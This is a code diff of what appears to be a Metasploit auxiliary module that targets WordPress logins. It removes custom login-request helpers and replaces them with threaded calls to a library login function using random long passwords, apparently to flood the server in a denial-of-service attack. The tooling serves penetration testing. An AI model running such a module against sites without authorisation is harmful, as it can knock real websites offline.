@@ -60,34 +60,6 @@ class Metasploit3 < Msf::Auxiliary
     datastore['THREADS']
   end
 
-  def wordpress_long_password_post_data(user, pass, redirect)
-    post_data = {
-      'log'         => user.to_s,
-      'pwd'         => pass.to_s,
-      'redirect_to' => redirect.to_s,
-      'reauth'      => 1,
-      'testcookie'  => '1',
-      'wp-submit'   => 'Login'
-    }
-
-    post_data
-  end
-
-  def wordpress_long_password_login(user, pass)
-    begin
-      redirect = "#{target_uri}wp-admin/"
-      res = send_request_cgi(
-        'method'      => 'POST',
-        'uri'         => wordpress_url_login,
-        'vars_post'   => wordpress_long_password_post_data(user, pass, redirect)
-      )
-
-      return res
-    rescue
-      return nil
-    end
-  end
-
   def user_exists(user)
     exists = wordpress_user_exists?(user)
     if exists
@@ -124,7 +96,11 @@ class Metasploit3 < Msf::Auxiliary
 
         threads = (1..ubound).map do |i|
           Thread.new(i) do |i|
-            wordpress_long_password_login(username, Rex::Text.rand_text_alpha(plength))
+            begin
+              wordpress_login(username, Rex::Text.rand_text_alpha(plength))
+            rescue
+              print_error("#{peer} - Timed out during request #{i}")
+            end
           end
         end
 
